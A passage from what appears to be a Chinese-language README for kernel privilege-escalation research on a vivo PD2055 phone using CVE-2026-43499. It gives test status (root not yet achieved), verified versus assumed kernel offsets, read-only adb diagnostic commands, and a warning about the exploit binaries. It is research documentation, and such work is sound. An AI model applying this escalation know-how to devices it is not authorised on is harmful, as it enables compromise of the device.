| 设备端 diag_params 运行 | 需真机 | **NOT TESTED**（本轮不在真机运行） |
| 设备端 KernelSnitch（修复版） | 需真机 | **NOT TESTED**（关键待验证项） |
| 完整提权（uid=0） | 需真机 | **NOT TESTED / 未达成** |

诚实声明：**尚未在任何真机上取得 uid=0，也尚未用修复版在真机重测 KernelSnitch。**
本轮修复消除了一个**已确认**的失败根因（typedef 反转导致用户态哈希≠内核哈希），
但能否成功定位 mm 仍需真机验证（依赖 §8.5 列出的其余条件）。

---

## 15. 已验证结论 vs 仍是假设

**已通过代码/固件验证（主机或静态）：**
- kallsyms 结构与全部符号偏移：6 重独立验证（计数/markers 429/429/段序/聚簇/ARM64 抽查/数组逐字节）
- vivo 过滤了 commit_creds/prepare_kernel_cred/init_cred/kernel_init/init_task 等符号
- `union futex_key` 布局 = word@0/ptr@8/offset@16（对照 v4.19 官方头文件 + `_Static_assert`）
- 修复后用户态 futex 哈希与**独立转录的内核参考**逐位一致，且依赖 mm（18/18 单测）
- 旧反转布局确实与内核不符（bug 真实存在，已复现）
- mm_struct=960B/order3、三个 aarch64 构建产物 SHA256、noroot 版排除最终提权代码

**仍是假设（需真机或反汇编确认，未验证）：**
- **vivo 4.19.152-perf+ 未修改 `hash_futex()`**：我对照的是上游 v4.19，
  **尚未反汇编 PD2055 boot.img 内的实际 `hash_futex()`**。若 vivo 改过，单测结论不适用。
- `KIMAGE_TEXT_BASE=0xffffff8008080000`：KASLR 运行时才定，沿用 K40 同族假设。
- task_struct/cred/pipe 等**结构体字段偏移**：与 K40 4.19 参考逐项一致，但未从本机
  DWARF 证实。设备 `CONFIG_IKHEADERS=y`，下一轮可从 Image 提取头文件精确验证。
- `SLIDE_RANDOM_BOOT_ID_DATA`：被过滤的静态符号，暂等于 sysctl_bootid，需运行时确认。
- **KernelSnitch 在修复版下能否真机定位 mm**：原理成立，但受 mm 尺寸/slab/扫描区间/
  时序噪声/vivo 加固（SLUB_MIRROR）影响，未验证。

---

## 16. 下一轮可在真机执行的"只读"诊断命令（仅类别 A，安全）

以下命令**全部只读**（类别 A/B），不提权、不触发 CVE、不写分区、不改 SELinux：

```bash
# 1. 【只读安全】参数诊断（验证 target.h 与真机一致）
adb push exploit/build/pd2055-4.19.152-perf/bin/diag_params /data/local/tmp/
adb shell /data/local/tmp/diag_params

# 2. 确认 mm_struct / kmalloc slab 几何
adb shell "cat /proc/slabinfo | grep -E 'mm_struct|kmalloc-1k|kmalloc-rcl'"

# 3. 确认 CPU 数（futex_hashsize = roundup_pow2(256*cpus)）
adb shell "cat /sys/devices/system/cpu/possible"

# 4. 确认内核版本 / KASLR / 关键 config
adb shell "uname -a; zcat /proc/config.gz | grep -E 'IKHEADERS|KALLSYMS|SLUB_MIRROR|FUTEX'"

# 5. 提取 kheaders（CONFIG_IKHEADERS=y）以精确验证结构体偏移
adb shell "cat /sys/kernel/kheaders.tar.xz" > kheaders.tar.xz   # 若存在

# 6. 反汇编验证 vivo 是否改过 hash_futex()（消除 §15 的关键假设）
#    从 boot.img 提取 kernel Image 后，定位 hash_futex 并反汇编，
#    确认 jhash2 的输入起点/长度与上游一致。这是下一轮的首要静态任务。
```

> ⚠️ **本仓库不提供"自动在真机运行 exploit"的指令。** 类别 C 的 `preload.so` /
> `preload_noroot.so` 都会触发 CVE-2026-43499 并写内核内存，可能崩溃设备，
> **不是只读诊断**。仅在研究者显式构建、充分理解风险、且用于自有硬件时手动运行。
> 在未能证明其不修改内核状态前（无法证明，因为它本就是 exploit），不应被当作诊断工具。

---

## 17. 致谢和参考

- [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40) by yijiacloud (Apache-2.0)
- [CVE-2026-43499](https://nvd.nist.gov/vuln/detail/CVE-2026-43499) — rtmutex remove_waiter() UAF
- [Linux v4.19 include/linux/futex.h](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/futex.h?h=v4.19) — `union futex_key` 字段顺序（权威依据）
- [Linux v4.19 kernel/futex.c](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/futex.c?h=v4.19) — `hash_futex()` / `get_futex_key()` 原文
- 上游: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) (IonStack)
- [VIVO-OTA-Tracker](https://github.com/mytiantian001/VIVO-OTA-Tracker) — vivo OTA 查询工具
- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) — 内核符号提取（在 vivo 修改上失败）

## 18. 许可证 / License

本仓库使用 **GPLv3** 许可证。exploit 源码继承上游 Apache-2.0 许可证。

---

*本研究仅供教育目的。请仅在你自己拥有的硬件上使用。*
*This research is for educational purposes. Use only on hardware you own.*
